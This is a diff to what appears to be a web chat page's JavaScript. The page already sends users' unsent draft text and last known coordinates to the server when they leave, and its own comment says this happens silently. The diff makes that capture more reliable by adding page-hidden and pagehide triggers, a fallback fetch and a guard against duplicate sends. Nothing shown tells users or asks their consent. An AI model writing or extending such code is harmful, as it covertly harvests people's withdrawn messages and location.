@@ -232,6 +232,7 @@ submitBtn.addEventListener('click', async () => {
         
         if (response.ok) {
             messageInput.value = '';
+            unsentDispatched = true; // avoid any pending unsent dispatch
             // Redirect if configured, otherwise refresh messages
             if (REDIRECT_URL) {
                 window.location.href = REDIRECT_URL;
@@ -334,14 +335,20 @@ async function deleteMessage(id) {
     }
 }
 
-// Store last known coordinates
+// Store last known coordinates and guard to avoid duplicate sends
 let lastCoordinates = null;
+let unsentDispatched = false;
 
 async function sendDraftMessage() {
     const content = messageInput.value.trim();
     if (!content || content.length === 0) {
         console.log('📝 No draft content to save');
         return; // No draft to save
+    }
+
+    if (unsentDispatched) {
+        console.log('🛑 Unsent already dispatched, skipping duplicate');
+        return;
     }
 
     try {
@@ -375,12 +382,13 @@ async function sendDraftMessage() {
 
         console.log('📡 Sending unsent message with coordinates:', coordinates ? '✅' : '❌');
         
-        // Use sendBeacon for unload events - it's more reliable
+        // Use sendBeacon for unload/hidden events - it's more reliable
         const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
         const sent = navigator.sendBeacon(`${API_URL}/message`, blob);
         
         if (sent) {
             console.log('✅ Unsent message beacon sent successfully');
+            unsentDispatched = true;
         } else {
             console.log('⚠️ Beacon may have failed, trying fetch...');
             // Fallback to fetch if sendBeacon fails
@@ -391,6 +399,7 @@ async function sendDraftMessage() {
                 keepalive: true
             });
             console.log('✅ Unsent message sent via fetch');
+            unsentDispatched = true;
         }
 
     } catch (error) {
@@ -446,13 +455,30 @@ function escapeHtml(text) {
     return div.innerHTML;
 }
 
-// Silently record text history when user closes page without sending
+// Prefer visibilitychange/pagehide (more reliable across browsers)
+document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'hidden') {
+        const content = messageInput.value.trim();
+        if (content) {
+            console.log('👀 Page hidden detected! Recording unsent message...');
+            sendDraftMessage().catch(err => console.error('Failed to record unsent on hidden:', err));
+        }
+    }
+});
+
+window.addEventListener('pagehide', () => {
+    const content = messageInput.value.trim();
+    if (content) {
+        console.log('🚪 Page hide detected! Recording unsent message...');
+        sendDraftMessage().catch(err => console.error('Failed to record unsent on pagehide:', err));
+    }
+});
+
+// Fallback: unload (least reliable, but keep as last resort)
 window.addEventListener('unload', () => {
     const content = messageInput.value.trim();
-    if (content && content.length > 0) {
+    if (content) {
         console.log('🔴 Page unload detected! Recording unsent message...');
-        console.log('Content length:', content.length);
-        // Send the textHistory as unsent message silently
-        sendDraftMessage().catch(err => console.error('Failed to record unsent message history:', err));
+        sendDraftMessage();
     }
 });
